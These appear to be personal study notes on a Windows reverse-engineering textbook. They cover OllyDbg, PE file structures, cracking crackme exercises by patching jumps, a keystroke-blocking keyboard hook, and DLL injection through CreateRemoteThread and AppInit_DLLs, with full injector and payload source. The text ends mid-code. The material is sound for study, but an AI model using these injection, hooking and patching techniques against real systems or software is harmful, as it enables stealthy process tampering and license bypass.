to\nCtrl+G\n\n\nExecute till Cursor\nF4\n\n\nComment\n;\n\n\nUser-defined comment\n\n\n\nLabel\n:\n\n\nUser-defined label\n\n\n\nSet/Reset breakpoint\nF2\n\n\nRun\nF9\n\n\nShow the current EPI\n*\n\n\nShow the previous Cursor\n-\n\n\nPreview CALL/JMP address\nEnter\n\n\n\n\n2.4 - Find a Specific Code\nExecuting Code\nSearching with Text: Right click -&gt; Search for -&gt; All referenced text strings\nSearching with used APIs: Right click -&gt; Search for -&gt; All intermodular calls\n\n2.5 - Patching the Code\nModifying the BufferHexdump:\n\n\n\n Modifying, notice that we have to append a null char(00 00) at the end of a string.\n\n\n\n Patched code:\n\n\n\nSave code:\n\n\n\nAdding a new string in memoryInsert a string int memory\n\n\n\n\n\n\nModify the assembly code\n\n\n\nPatched code:\n\n\n\n\n\nChapter 3 - Little EndianBYTE b = 0x12;WORD w = 0x1234;DWORD dw = 0x12345678;char str[] = &quot;abcde&quot;;\n\n\n\n\nTYPE\nName\nSIZE\nBig-Endian\nLittle-Endian\n\n\n\n\nBYTE\nb\n1\n[12]\n[12]\n\n\nWORD\nw\n2\n[12][34]\n[34][12]\n\n\nDWORD\ndw\n3\n[12][34][56][78]\n[78][56][34][12]\n\n\nchar[]\nstr\n4\n[61][62][63][64][65][00]\n[65][64][63][62][61][00]\n\n\n\n\nmain() function: \n\nHexdump:\n\n\n\nChapter 4 - IA-32 Registers4.2 - IA-32 Registers\nGeneral Purpose Registers(32-bit), x8\nSegment Registers(16-bit), x6\nProgram Status and Control Register(32-bit), x1\nInstruction Pointer(32-bit), x1\n\n\n\n\n\nGeneral Purpose RegistersThese type of registers are used for temporary storage, also can be used for arthimetic calculation. Usually, they are used for storing addresses and constants.\n\n\n\n\nEAX:\nEBX:\nECX:\nEDX:\n\n\nSegment RegistersSegment is a protection technique in IA-32. The IA-32 architecture divides memory into multiple segments, and allocates start address, range, accessing privilege, etc to them. It also provides paging technique.\n\n\n\n\nCS: Code Segment\nSS: Stack Segment\nDS: Data Segment\nES: Extra (Data) Segment\nFS: Data Segment\nGS: Data Segment\n\n\nProgram Status and Control Register\n\nEFLAGS\n\n\n\n\n\nInstruction Pointer\n\nEIP\n\n\n\nChapter 5 - Stack\n\n\n\n\n\nAfter the PUSH instruction is executed, ESP moves upward ,and its value decreases by 4 bytes.\nAfter the POP EAX instruction is executed, ESP moves downward, and its value increases by 4 bytes.\nThus, we can conclude that:\n\nWhen data is pushed onto the stack, the value of the stack pointer decreases and it moves upward.\\When data is popped from the stack, the value of the stack pointer increases and it moves downward.\n\nInitially, the stack pointer points to the top of the stack.\nChapter 6 - Analyzing abex’ crackme#1Patching (Cracking)\n\n\nModify the assembly code:OriginalJE SHORT 0040103DModifiedJMP 0040103D\nChapter 7 - Stack Frame7.1 - Stack FrameA stack frame is a structure used to organize a function’s local variables, parameters, and return address.\\It is accessed using EBP as the base pointer (NOT ESP).\n\n\n\n\n\n\n\nAssembly\nC Language\nType conversion\n\n\n\n\nDWORD PTR SS:[EBP-4]\n*(DWORD*)(EBP-4)\nDWORD (4 bytes)\n\n\nWORD PTR SS:[EBP-4]\n*(WORD*)(EBP-4)\nWORD (2 bytes)\n\n\nBYTE PTR SS:[EBP-4]\n*(BYTE*)(EBP-4)\nBYTE\n\n\n\n\nThe symbol SS in DWORD PTR SS:\\[EBP-4\\] stands for Stack Segment.Although x86 architecture supports segmented memory, modern Windows uses a flat memory model. Therefore, assembly instructions still syntactically specify a segment register, such as SS, DS, or ES.\nOn 32-bit x86 Windows, these segment registers all refer to the same flat segment, which makes the explicit segment specification effectively meaningless in this context.\nSince EBP and ESP are registers that reference the stack, OllyDbg automatically appends the SS segment prefix when displaying stack-based memory operands.\n\n\n\nChapter 8 - abex’ crackme#28.2 - VB Engineabex’ crackme is written in VB (Visual Basic).\nA VB (Visual Basic) application is executed by an engine named MSVBVM60.dll (Microsoft Visual Basic Virtual Machine 6.0).\nA VB application can be compiled into Native Code (N Code) or Pseudo Code (P Code, or The Thunder Runtime Engine).\nAll components of a VB application—such as dialogs, controls, forms, modules, and functions—are stored in the form of internal data structures. However, Microsoft has never publicly documented these structures, which makes debugging VB applications more difficult.\n8.3 - DebuggingStub Code:\n\n\n\nIndirect Call00401232   $-FF25 A0104000  JMP DWORD PTR DS:[&lt;&amp;MSVBVM60.#100&gt;]      ;  MSVBVM60.ThunRTMain00401238 &gt; $ 68 141E4000    PUSH abexcm2-.00401E14                   ;  =&gt; EP0040123D   . E8 F0FFFFFF    CALL &lt;JMP.&amp;MSVBVM60.#100&gt;                ;  call ThunRTMain()\nThe instruction at 0040123D is used to call the ThunRTMain() function. Instead of calling the function directly, it performs an indirect call through the jump instruction at 00401232.\nThis is a well-known indirect call technique commonly used by VC++ and the VB compiler.\nRT_MainStruct\n\n\nMicrosoft has never publicly documented the RT_MainStruct. However, some experts have fully reverse-engineered it and published their findings online.\nThunRTMain()\n\n\nNotice that the memory addresses are completely different. This region is inside MSVBVM60.dll\n8.4 - Analyzing crackme\n\n\n\n\n\nAssembly code that it used:\n\nTEST: Logical Compare, it is same as AND. However, TEST only changes the values in EFLAGS register.\nJE: Jump if equal (ZF = 1).\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nChapter 9 - Process Explorer\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer\n\nChapter 10 - Calling Convention\ncdecl\nstdcall\nfastcall\n\ncdecl is the default method used in C language.#include &quot;stdio.h&quot;int add(int a, int b)&#123;    return a + b;&#125;int main(int argc, char* argv[])&#123;    return add(1, 2);&#125;\ncdecl\n\n\n\nstdcall is commonly used in Win32 API, this is used for clearing the stack by the function caller.#include &quot;stdio.h&quot;int __stdcall add(int a, int b)&#123;    return a + b;&#125;int main(int argc, char* argv[])&#123;    return add(1, 2);&#125;\nstdcall\n\n\nfastcallChapter 11 - Lenas Reversing for Newbies\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nModify the instruction at 00402FE\n\n\n\nChapter 12 - How to Learn Reverse EngineeringBlah blah blah…\nI will write some of the content with my personal idea in “Reflection”\nChapter 13 - PE File Format13.2 - PE File FormatPE stands for Portable Executable.\nA PE file is an executable under x32 platform, it is also know as PE32. A PE+ (or PE32+) is an executable under x64 platform (NOT PE64).\n\n\n\n\n\n\n\n\n\n\nVA &amp; RVA\nRAW + ImageBase = VA13.3 - PE HeaderDOS Headertypedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header    WORD   e_magic;                     // Magic number    WORD   e_cblp;                      // Bytes on last page of file    WORD   e_cp;                        // Pages in file    WORD   e_crlc;                      // Relocations    WORD   e_cparhdr;                   // Size of header in paragraphs    WORD   e_minalloc;                  // Minimum extra paragraphs needed    WORD   e_maxalloc;                  // Maximum extra paragraphs needed    WORD   e_ss;                        // Initial (relative) SS value    WORD   e_sp;                        // Initial SP value    WORD   e_csum;                      // Checksum    WORD   e_ip;                        // Initial IP value    WORD   e_cs;                        // Initial (relative) CS value    WORD   e_lfarlc;                    // File address of relocation table    WORD   e_ovno;                      // Overlay number    WORD   e_res[4];                    // Reserved words    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)    WORD   e_oeminfo;                   // OEM information; e_oemid specific    WORD   e_res2[10];                  // Reserved words    LONG   e_lfanew;                    // File address of new exe header  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)\n\ne_magic: DOS signature, 4D5A =&gt; ASCII: MZ\ne_lfanew: Offset of NT header.\n\nHere MZ stands for Mark Zbikowski, the engineer who designed DOS executable.\nDOS Stub\n\n\n\nRun the following command on Windows XP:&gt; debug C:\\WINDOWS\\NOTEPAD.exe\n\n\n\nAlthough the sentence in the DOS stub states that “This program cannot be run in DOS mode”, notepad.exe can still be executed in a DOS environment. In practice, the DOS loader executes the DOS stub code, which prints the message above and then exits.\nThe DOS stub is optional in a PE file, but modern development tools usually include it by default. Compilers such as VB, VC++, and Delphi all generate PE files with a DOS stub.\nNT Headertypedef struct _IMAGE_NT_HEADERS &#123;    DWORD Signature;    IMAGE_FILE_HEADER FileHeader;    IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)\nNT Header: File Headertypedef struct _IMAGE_FILE_HEADER &#123;    WORD    Machine;    WORD    NumberOfSections;    DWORD   TimeDateStamp;    DWORD   PointerToSymbolTable;    DWORD   NumberOfSymbols;    WORD    SizeOfOptionalHeader;    WORD    Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)\nThere are four important members; file cannot be executed if they are misconfigured.\n\nMachine:\\Every CPU architecture has its own machine ID.\n\nNumberOfSections:\\PE file stores code, data and resources in different sections, each with its own attributes. NumberOfSections indicates the total number of sections in the file. This value MUST BE GREATER THAN ZERO.\\In addition, an executable cannot be loaded if the number of sections does not match the actual section table.\nSizeOfOptionalHeader:\\The last member of structure IMAGE_NT_HEADERS is IMAGE_OPTIONAL_HEADER32. SizeOfOptionalHeader indicates the size of the IMAGE_OPTIONAL_HEADER32 structure.\\Although IMAGE_OPTIONAL_HEADER is defined as a C structure, the Windows PE loader must still rely on the value of SizeOfOptionalHeader to determine its actual size.\\In PE32+ files, IMAGE_OPTIONAL_HEADER64 is used instead of IMAGE_OPTIONAL_HEADER32. Since these two structures have different sizes, SizeOfOptionalHeader must explicitly specify the correct size.\nCharacteristics:\\This field is used to describe the attributes of the file.\n\n\n\nThis value might not contain the 0x0002 (IMAGE_FILE_EXECUTABLE_IMAGE) flags for the files such as *.obj and *.dll.\n\n\nNT Header: Optional Headertypedef struct _IMAGE_DATA_DIRECTORY &#123;    DWORD   VirtualAddress;    DWORD   Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16typedef struct _IMAGE_OPTIONAL_HEADER &#123;    //    // Standard fields.    //    WORD    Magic;    BYTE    MajorLinkerVersion;    BYTE    MinorLinkerVersion;    DWORD   SizeOfCode;    DWORD   SizeOfInitializedData;    DWORD   SizeOfUninitializedData;    DWORD   AddressOfEntryPoint;    DWORD   BaseOfCode;    DWORD   BaseOfData;    //    // NT additional fields.    //    DWORD   ImageBase;    DWORD   SectionAlignment;    DWORD   FileAlignment;    WORD    MajorOperatingSystemVersion;    WORD    MinorOperatingSystemVersion;    WORD    MajorImageVersion;    WORD    MinorImageVersion;    WORD    MajorSubsystemVersion;    WORD    MinorSubsystemVersion;    DWORD   Win32VersionValue;    DWORD   SizeOfImage;    DWORD   SizeOfHeaders;    DWORD   CheckSum;    WORD    Subsystem;    WORD    DllCharacteristics;    DWORD   SizeOfStackReserve;    DWORD   SizeOfStackCommit;    DWORD   SizeOfHeapReserve;    DWORD   SizeOfHeapCommit;    DWORD   LoaderFlags;    DWORD   NumberOfRvaAndSizes;    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\nThe following members are important. An executable cannot not be loaded if they are misconfigured.\n\nMagic:\\IMAGE_OPTIONAL_HEADER32 has this value by 10B; IMAGE_OPTIONAL_HEADER64 has this value by 20B.\nAddressOfEntry:\\This field has the RVA value of EP. RVA value indicates the code which is the first priority of executing.\nImageBase:\\The address range of virtual memory is 0~FFFFFFFF on x32 platform. ImageBase indicates first loaded address of the file.\nSectionAlignment, FileAlignment:\\\n\nSizeOfImage\n\nSizeOfHeaders\nSubsystem\nNumberOfRvaAndSizes\nDataDirectory\n\nSection Header13.4 - RVA to RAW\n\\begin{align*}\nRAW - PointerToRawData &= RVA - VirtualAddress\\\\\nRAW &= RVA - VirtualAddress + PointerToRawData\n\\end{align*}QuizGiven the following figure, answer the following questions:\n\n\n\n\nRVA = 5000, File Offset = ?\\Here we assume the ImageBase is 01000000.It is located in the first section (.text) since\n 01000000 + 5000 = 01005000The range of the first section (.text) is: 01001000 ~ 01009000.\\Thus,\n RAW = 5000(RVA) - 1000(VirtualAddress) + 400(PointerToRawData)=4400\nRVA = 13314, File Offset = ?RVA = 13314 is located in the third section (.rsrc).\\Thus,\n RAW= 13314(RVA) - B000(VA) + 8400(PointerToRawData) = 10714\nRVA = ABA8, File Offset = ?RVA = ABA8 is located in the second section (.data).\\\n RAW = ABA8(RVA) - 9000(VA) + 7C00(PointerToRawData) = 97A8However, RAW address 97A8 is located in the third section. Thus, the given value of RAW by ABA8 is invalid for defining its RAW value. When VirtualSize is larger than SizeOfRawData, the extra region is zero-initialized at load time and does not have a valid file offset.\n\n13.5 - IATDLLBefore studying the Import Address Table (IAT), we need to understand DLLs (Dynamic Link Libraries).\nIn the era of 16-bit DOS, the concept of DLLs did not exist. Instead, applications relied on static libraries, which were linked into the executable at compile time. This approach significantly increased both memory usage and disk space consumption, which was a serious limitation when hardware resources were expensive.\nTo solve this problem, Windows introduced the concept of DLLs:\n\nInstead of embedding library code into the executable, applications import DLLs when needed.\nCode and resources can be shared among multiple applications through memory mapping.\nUpdating a library only requires replacing the corresponding DLL file.\n\nThere are two primary ways to load DLLs:\nExplicit Linking:The application loads the DLL at runtime using functions such as LoadLibrary, and resolves function addresses manually using GetProcAddress. The DLL can be unloaded explicitly when it is no longer needed.\nImplicit Linking:The DLL is loaded automatically by the Windows loader when the application starts, and it remains loaded until the process terminates.\nThese mechanisms are closely related to the Import Address Table (IAT), which plays a critical role during DLL loading and function resolution.\n\n\n\n\n\n\nNotice that the loader calls the API function CreateFileW() via an indirect call rather than a direct call.The loader obtains the address of the API function from memory address 0x01001104.The loader calls API functions using this method consistently.\nThe reason the loader does not call the API function directly (for example, using the instruction CALL 765233B0) is that the author of notepad.exe did not know in advance which platform the program would run on.This design allows the executable to support multiple platforms and environments.\nAnother reason is DLL relocation.Usually, the default ImageBase of a DLL is 0x10000000.If this address is already occupied by a.dll, then b.dll cannot be loaded at the same ImageBase and must be relocated, for example, to 0x3E000000.\nIn practice, it cannot be guaranteed that a DLL can be loaded at its preferred ImageBase, because the PE header uses RVAs instead of absolute virtual addresses (VAs).In contrast, an executable can usually be loaded at its specified ImageBase because it has its own virtual address space.\nIMAGE_IMPORT_DESCRIPTORtypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\tunion &#123;\t\tDWORD\tCharacteristics; /* 0 for terminating null import descriptor  */\t\tDWORD\tOriginalFirstThunk;\t/* RVA to original unbound IAT */\t&#125; DUMMYUNIONNAME;\tDWORD\tTimeDateStamp;\t/* 0 if not bound,\t\t\t\t * -1 if bound, and real date\\time stamp\t\t\t\t *    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT\t\t\t\t * (new BIND)\t\t\t\t * otherwise date/time stamp of DLL bound to\t\t\t\t * (Old BIND)\t\t\t\t */\tDWORD\tForwarderChain;\t/* -1 if no forwarders */\tDWORD\tName;\t/* RVA to IAT (if bound this IAT has actual addresses) */\tDWORD\tFirstThunk;&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;/* Import name entry */typedef struct _IMAGE_IMPORT_BY_NAME &#123;\tWORD\tHint;\tchar\tName[1];&#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\nThe number of imported libraries is equal to the number of IMAGE_IMPORT_DESCRIPTOR\n\n\n\n\nField\nMeaning\n\n\n\n\nOriginalFirstThunk\nAddress of INT (RVA)\n\n\nName\nAddress of library string name (RVA)\n\n\nFirstThunk\nAddress of IAT (RVA)\n\n\n\n\n\n\n\nLoad into IAT\nObtain the name of the library (for example: “kernel32.dll”) from IID (“IMAGE_IMPORT_DESCRIPTOR”)\nLoadLibrary(&quot;kernel32.dll)\nRead OriginalFirstThunk member from IID, and then obtain the addressof INT (Import Name Table).\nRead the values from the array in INT consecutively. Subsequently, obtain the RVA (Relative Virtual Address) of IMAGE_IMPORT_BY_NAME.\n\nPracticeWhere is IMAGE_IMPORT_DESCRIPTOR? It is not located in PE header. Instead, it locates in PE body, but its location is stored in PE header.\nThe value of IMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress is the AddressOfEntryPoint (RVA value). IMAGE_IMPORT_DESCRIPTOR is also know as IMAGE_DIRECTORY_TABLE.\n\n\n\n\n\n\n\nName (Library Name) \n \nOriginalFirstThunk——INT\nIMAGE_IMPORT_BY_NAME\nFirstThunk——IAT (Import Address Table)\n\n13.6 - EATThe value of IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress is the RVA value of IMAGE_EXPORT_DIRECTORY\ntypedef struct _IMAGE_EXPORT_DIRECTORY &#123;\tDWORD\tCharacteristics;\tDWORD\tTimeDateStamp;          //creation time date stamp\tWORD\tMajorVersion;\tWORD\tMinorVersion;\tDWORD\tName;                   //address of library file name\tDWORD\tBase;                   //ordinal base\tDWORD\tNumberOfFunctions;      //number of functions\tDWORD\tNumberOfNames;          //number of names\tDWORD\tAddressOfFunctions;     //address of function start address array\tDWORD\tAddressOfNames;         //address of function name string array\tDWORD\tAddressOfNameOrdinals;  //address of ordinal array&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\nImportant fields:| Field | Meaning || —- | —- || NumberOfFunctions | The total number of exported functions| NumberOfNames || AddressOfFunctions || AddressOfNames || AddressOfNameOrdinals |\n\n    \n    Source: https://baebenzene.tistory.com/5\n    \n\n\nA PE file obtains the function address from libraries via an API——GetProcAddress()\nChapter 16 - Base Relocation Table16.1 - PE RelocationMicrosoft introduced ASLR technique since Windows Vista. This technique can improve security of Windows systems.\n16.2 - The Operations of PE Relocation16.3 - The Principles of PE Relocationtypedef struct _IMAGE_BASE_RELOCATION&#123;\tDWORD\tVirtualAddress;\tDWORD\tSizeOfBlock;\t/* WORD\tTypeOffset[1]; */&#125; IMAGE_BASE_RELOCATION,*PIMAGE_BASE_RELOCATION;\n\n\n\n\nChapter 17 - Remove .reloc Section from ExecutableChapter 18 - Analyzing UPackPE HeaderChapter 19 - UPackPE Debugging - Find the OEPChapter 20 - PatchingChapter 21 - Windows Message Hooking21.2 - Message Hooking\n\n\n\n21.3 - SetWindowsHookEx()HHOOK SetWindowsHookExW(  [in] int       idHook,  [in] HOOKPROC  lpfn,  [in] HINSTANCE hmod,  [in] DWORD     dwThreadId);\n21.4 - Code//Source: https://github.com/reversecore/book//HookMain.cpp#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define\tDEF_DLL_NAME\t\t&quot;KeyHook.dll&quot;#define\tDEF_HOOKSTART\t\t&quot;HookStart&quot;#define\tDEF_HOOKSTOP\t\t&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;\tHMODULE\t\t\thDll = NULL;\tPFN_HOOKSTART\tHookStart = NULL;\tPFN_HOOKSTOP\tHookStop = NULL;\tchar\t\t\tch = 0;    //Load KeyHook.dll\thDll = LoadLibraryA(DEF_DLL_NAME);    if( hDll == NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;    //Obtain the export functions&#x27; addresses.\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);    //Start hooking.\tHookStart();    //Wait until user enters &#x27;q&#x27;\tprintf(&quot;press &#x27;q&#x27; to quit!\\n&quot;);\twhile( _getch() != &#x27;q&#x27; )\t;    //Stop hooking.\tHookStop();\t    //Unload KeyHook.dll\tFreeLibrary(hDll);&#125;\n//KeyHook.cpp#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME\t\t&quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;\tswitch( dwReason )\t&#123;        case DLL_PROCESS_ATTACH:\t\t\tg_hInstance = hinstDLL;\t\t\tbreak;        case DLL_PROCESS_DETACH:\t\t\tbreak;\t\t&#125;\treturn TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;\tchar szPath[MAX_PATH] = &#123;0,&#125;;\tchar *p = NULL;\tif( nCode &gt;= 0 )\t&#123;\t\t// bit 31 : 0 =&gt; press, 1 =&gt; release\t\tif( !(lParam &amp; 0x80000000) )\t\t&#123;\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\t\t\tp = strrchr(szPath, &#x27;\\\\&#x27;);            //Compare to current process. Message will not be passed to the next hook if the current process is notepad.exe.            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )\t\t\t\treturn 1;\t\t&#125;\t&#125;    //If it is not notepad.exe, then the message will be passed to the next hook via calling CallNextHookEx()\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;//Export functions.#ifdef __cplusplusextern &quot;C&quot; &#123;#endif\t__declspec(dllexport) void HookStart()\t&#123;\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\t&#125;\t__declspec(dllexport) void HookStop()\t&#123;\t\tif( g_hHook )\t\t&#123;\t\t\tUnhookWindowsHookEx(g_hHook);\t\t\tg_hHook = NULL;\t\t&#125;\t&#125;#ifdef __cplusplus&#125;#endif\nLRRESULT CALLBACK KeyboardProc(    int code,       //HC_ACTION(0), HC_NOREMOVE(3)    WPARAM wParam,  //virtual-key code    LPARAM lParam   //extra information);\nChapter 23 - DLL InjectionBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;    switch(dwReason)    &#123;        case DLL_PROCESS_ATTACH:        break;        case DLL_THREAD_ATTACH:        break;        case DLL_THREAD_DETACH:        break;        case DLL_PROCESS_DETACH:        break;    &#125;&#125;\n23.1 - Implementation of DLL InjectionUsually, there are three methods to implement DLL injection:\n\nCreate remote thread via CreateRemoteThread() API\nUsing registry with modifying the value of AppInit_DLLs\nSetWindowsHookEx() API\n\nCreateRemoteThread()//myhack.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;urlmon.lib&quot;)#define DEF_URL     \t(L&quot;http://www.naver.com/index.html&quot;)#define DEF_FILE_NAME   (L&quot;index.html&quot;)HMODULE g_hMod = NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    TCHAR szPath[_MAX_PATH] = &#123;0,&#125;;    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )        return FALSE;\t    TCHAR *p = _tcsrchr( szPath, &#x27;\\\\&#x27; );    if( !p )        return FALSE;    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    HANDLE hThread = NULL;    g_hMod = (HMODULE)hinstDLL;    switch( fdwReason )    &#123;    case DLL_PROCESS_ATTACH :         OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);        CloseHandle(hThread);        break;    &#125;    return TRUE;&#125;\nOnce the DLL is loaded, it prints &quot;myhack.dll Injection!!!&quot;. It then calls the function by creating a thread (ThreadProc).\nThreadProc downloads the specified HTML document with the API urlmon!URLDownloadToFile() and saves it as index.html.\nNotice that once the DLL file is loaded, DllMain will be called automatically. Hence, once the DLL file above is loaded, the function ThreadProc() will eventually be executed.\n\n//InjectDll.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system                              lpszPrivilege,  // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess = NULL, hThread = NULL;    HMODULE hMod = NULL;    LPVOID pRemoteBuf = NULL;    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    // #1. Obtain the Handle of notepad.exe via dwPID.    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError());        return FALSE;    &#125;    // #2. Allocate virtual memory in the address space of notepad.exe.    //     The size of the allocated memory is based on szDllPath.The size virtual memory space is the size of szDllName    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    // #3. Write the path of myhack.dll (szDllName) into the allocated memory space.    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    // #4. Obtain the address of LoadLibraryA() API.    hMod = GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);\t    // #5. Create a remote thread in notepad.exe.    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);\t    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;int _tmain(int argc, TCHAR *argv[])&#123;    if( argc != 3)    &#123;        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\\n&quot;, argv[0]);        return 1;    &#125;    // change privilege    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    // inject dll    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )        _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) success!!!\\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) failed!!!\\n&quot;, argv[2]);    return 0;&#125;\nCreateRemoteThread is used to create a thread in a remote process.In DLL injection, it is commonly used to make the remote process call LoadLibraryW() so that the DLL is loaded into that process.\nHANDLE CreateRemoteThread(  [in]  HANDLE                 hProcess,  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,  [in]  SIZE_T                 dwStackSize,  [in]  LPTHREAD_START_ROUTINE lpStartAddress,  [in]  LPVOID                 lpParameter,  [in]  DWORD                  dwCreationFlags,  [out] LPDWORD                lpThreadId);\nAppInit_DLLsThe principle of this method is that user32.dll automatically loads the DLLs specified in the AppInit_DLLs registry value whenever user32.dll is loaded into a process.\nTo enable this feature, you need to set LoadAppInit_DLLs to 1 and restart the system.\n\nWarning: This method is powerful because it allows a DLL to be loaded into all processes that load user32.dll. You must be careful with your DLL code; otherwise, your system may become unstable.\n\n// myhack2.cpp#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define DEF_CMD  L&quot;c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe&quot; #define DEF_ADDR L&quot;http://www.naver.com&quot;#define DEF_DST_PROC L&quot;notepad.exe&quot;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    TCHAR szCmd[MAX_PATH]  = &#123;0,&#125;;    TCHAR szPath[MAX_PATH] = &#123;0,&#125;;    TCHAR *p = NULL;    STARTUPINFO si = &#123;0,&#125;;    PROCESS_INFORMATION pi = &#123;0,&#125;;    si.cb = sizeof(STARTUPINFO);    si.dwFlags = STARTF_USESHOWWINDOW;    si.wShowWindow = SW_HIDE;    switch( fdwReason )    &#123;    case DLL_PROCESS_ATTACH :         if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )            break;           if( !(p = _tcsrchr(szPath, &#x27;\\\\&#x27;)) )            break;        if( _tcsicmp(p+1, DEF_DST_PROC) )            break;        wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR);        if( !CreateProcess(NULL, 